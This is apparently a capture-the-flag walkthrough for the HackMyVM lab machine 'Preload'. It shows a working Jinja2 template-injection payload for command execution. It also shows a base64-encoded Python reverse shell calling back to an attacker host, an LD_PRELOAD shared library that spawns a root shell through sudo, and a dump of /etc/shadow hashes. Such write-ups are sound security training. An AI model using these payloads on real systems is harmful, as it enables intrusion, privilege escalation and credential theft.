---
title: CTF Walkthrough for HackMyVM Machine Preload
category: [Walkthrough, CTF]
tags: [HackMyVM, Writeup, Preload machine, SSTI]   
image:
  path: /assets/img/posts/walthrough/hackmyvm/2024-09-20-preload/box-preload.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Preload a machine among HackMyVM machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Machine Description
Name: Preload<br>
Goal: Get two flags<br>
OS: Linux<br>
Download link: [Preload](https://downloads.hackmyvm.eu/preload.zip)<br>
### Tools used
1) Nmap<br>
3) ffuf<br>
4) Netcat<br>

## Reconnaissance
We can't attack what we don't know so, we will start with a host discovering scan using Nmap to discover the IP address of the target.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Service]
└─$nmap -n -sn 10.0.2.16/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 15:07 BST
<SNIP>
Nmap scan report for 10.0.2.16
Host is up (0.00015s latency).
Nmap scan report for 10.0.2.22
Host is up (0.00077s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.92 seconds
```

Now that we have the target IP address, we can perform a service enumeration on the target using Nmap.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Service]
└─$sudo nmap -sV -sC -n 10.0.2.22  -oN serivice-scan.nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 15:08 BST
Nmap scan report for 10.0.2.21
Host is up (0.00022s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 4f:4c:82:94:2b:99:f8:ea:67:ff:67:3c:06:8a:71:b5 (RSA)
|   256 c4:2c:9b:c8:12:93:2f:8a:f1:57:1c:f6:ab:88:b9:61 (ECDSA)
|_  256 10:18:7b:11:c4:c3:d4:1a:54:cc:18:68:14:bb:2e:a7 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.18.0
5000/tcp open  landesk-rc LANDesk remote management
<SNIP>
Nmap done: 1 IP address (1 host up) scanned in 33.47 seconds
```

In the scan's result above, we can notice that a service runs on port 5000 which is not always common. Let's connect to this port manually and capture the service's banner.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Web]
└─$nc 10.0.2.22 5000 -v
10.0.2.22: inverse host lookup failed: Unknown host
(UNKNOWN) [10.0.2.22] 5000 (?) open
 * Serving Flask app 'code' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on all addresses.
   WARNING: This is a development server. Do not use it in a production deployment.
 * Running on http://10.0.2.22:50000/ (Press CTRL+C to quit)
```

We can see that the port appears to be occupied by a Flask application. The result also shows that the application is running on *http://10.0.2.22:50000/*. When we visit this link we receive an internal server error message.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Web]
└─$curl http://10.0.2.22:50000/ 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```
If we visit back our Netcat connection we will see a lot of error messages.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Web]
└─$nc 10.0.2.22 5000 -v
10.0.2.22: inverse host lookup failed: Unknown host
<SNIP>
 * Running on http://10.0.2.22:50000/ (Press CTRL+C to quit)
[2024-09-20 04:45:25,415] ERROR in app: Exception on / [GET]
Traceback (most recent call last):
<SNIP>
  File "/home/paul/code.py", line 10, in _
    result = render_template_string(_get)
  File "/usr/local/lib/python3.9/dist-packages/flask/templating.py", line 165, in render_template_string
    return _render(ctx.app.jinja_env.from_string(source), context, ctx.app)
<SNIP>
  File "/usr/local/lib/python3.9/dist-packages/jinja2/compiler.py", line 112, in generate
    raise TypeError("Can't compile non template nodes")
TypeError: Can't compile non template nodes
10.0.2.16 - - [20/Sep/2024 04:45:25] "GET / HTTP/1.1" 500 -
```

In the error messages above we can retrieve two important information i.e. the Flask web application accepts a GET parameter and uses the well-known Jinja2 template engine. Since the application uses a template engine we can assume that the value of the GET parameter is processed by the template engine. We can fuzz this parameter using a simple template code e.g. {{7*7}} and filter the response by response size.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Web]
└─$ffuf -ic -c -u 'http://10.0.2.22:50000/?FUZZ={{7*7}}' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 290 

<SNIP>

cmd                     [Status: 200, Size: 2, Words: 1, Lines: 1, Duration: 160ms]
:: Progress: [6453/6453] :: Job [1/1] :: 199 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

We successfully uncover the name of the GET parameter. We can attempt to visit the web application with this parameter to confirm our results.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Web]
└─$curl http://10.0.2.22:50000/?cmd='' 
Welcome!!!!!!!!!!!!! 
```

## Exploitation

The web application responds with a text message and not more with an internal server error message. If the web application does not filter the value of this parameter before passing it to the template engine, we will have a server-side template injection vulnerability (SSTI). We can use [Jinja2 SSTI cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)  to attempt different exploitation of SSTI vulnerability. We can test for this vulnerability by attempting to execute code on the server side.
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Web]
└─$curl -g http://10.0.2.22:50000/?cmd='{{self.__init__.__globals__.__builtins__.__import__("os").popen("id").read()}}'  
uid=1000(paul) gid=1000(paul) groups=1000(paul)
```

Our id command has been executed on the server and the web application appears to be run by the user Paul. Now that we know we have RCE on the server we can attempt to gain a reverse shell.
##### First, we start a listener on our attack host
```bash
┌──(pentester㉿kali)-[~/Preload/]
└─$nc -lvnp 1234
listening on [any] 1234 ...
```
##### Secondly we encode our payload to base64 and send it to the target
```bash
┌──(pentester㉿kali)-[~/Preload/Scans/Service]
└─$echo "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.2.16',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')\"" | base64 -w 0
cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjAuMi4xNicsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oJy9iaW4vYmFzaCcpIgo=                        

┌──(pentester㉿kali)-[~/Preload/Scans/Service]
└─$curl -g http://10.0.2.22:50000/?cmd='{{self.__init__.__globals__.__builtins__.__import__("os").popen("echo+cHl0aG9uMyAtYyAiaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjAuMi4xNicsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oJy9iaW4vYmFzaCcpIgo=|base64+-d|bash").read()}}'
```
##### Lastly we change the reverse shell received to a tty shell
```bash
┌──(pentester㉿kali)-[~/Preload/]
└─$nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.2.16] from (UNKNOWN) [10.0.2.22] 48818
paul@preload:/$ ^Z
zsh: suspended  nc -lvnp 1234

┌──(pentester㉿kali)-[~]
└─$stty raw -echo;fg
[1]  + continued  nc -lvnp 1234
                               export TERM=xterm
paul@preload:/$ 

```
Now we have a shell on the target as a local user on the system. We can use this access to read the local user flag and enumerate the system further.
```bash
paul@preload:/$ ls /home/paul
code.py  us3r.txt
```

## Post Exploitation

Local users are often given sudo rights on  a system to allow them to perform certain actions as the root user without giving them total control of the system. If we check Paul's sudo rights we will notice that Paul can run some interesting commands as root but the most interesting part is **env_keep+=LD_PRELOAD** this means that when Paul runs the sudo command it will use Paul's LD_PRELOAD environment variable and not the default one.
```bash
paul@preload:~$ sudo -l
Matching Defaults entries for paul on preload:
    env_reset, mail_badpass, env_keep+=LD_PRELOAD,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User paul may run the following commands on preload:
    (root) NOPASSWD: /usr/bin/cat, /usr/bin/cut, /usr/bin/grep, /usr/bin/tail,
        /usr/bin/head, /usr/bin/ss
```

The LD_PRELOAD environment variable allows the user to load a library before executing a binary. We can abuse this by creating a fake library that spawns a shell and since the binary is executed as root the shell will also spawn as root. We can use this C code snippet to create the fake library.
```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```
We can compile the code above using gcc on the target and produce a dynamic library.
```bash
paul@preload:/tmp$ cat root.c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void _init(){
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
paul@preload:/tmp$ gcc -fPIC -shared -o root.so root.c -nostartfiles
```

Now that we have our fake dynamic library we can run any of the allowed commands as root using sudo and we will obtain a root shell.
```bash
paul@preload:/tmp$ sudo LD_PRELOAD=/tmp/root.so  /usr/bin/cat /tmp/root.c 
root@preload:/tmp# ls /root
20o7.txt
```

Great, we have obtained root access on the target. We can use this access to read the root flag. In a real-world assessment, we could attempt to crack users' passwords and if we were successful we could include it in our report. We can obtain these passwords by using our sudo rights to read the /etc/shadow file.
```bash
sudo /usr/bin/cat /etc/shadow
root:$y$j9T$m1D134z4UtKiulIBEBA5S1$NjPX1ymOm2EPlJfWdE.u5SUdvfM6/R7r8mHdY4Mbct0:19000:0:99999:7:::
daemon:*:18961:0:99999:7:::
<SNIP>
systemd-coredump:!*:18961::::::
paul:$y$j9T$YDzRSa1.vIn8q85CLan4g.$i.irTciZrOeLcwqQsxdlcxM3/gUSqAUYX8.Otiif34/:19000:0:99999:7:::
```

## Conclusion
Congratulations! In this walkthrough, you have exploited the Jinja2 template engine to obtain a reverse shell on the target. Finally, you exploited the user sudo rights to elevate your privileges as root. This machine was designed to show the importance of sanitising user input before passing it to a template engine. Thank you for following up on this walkthrough.
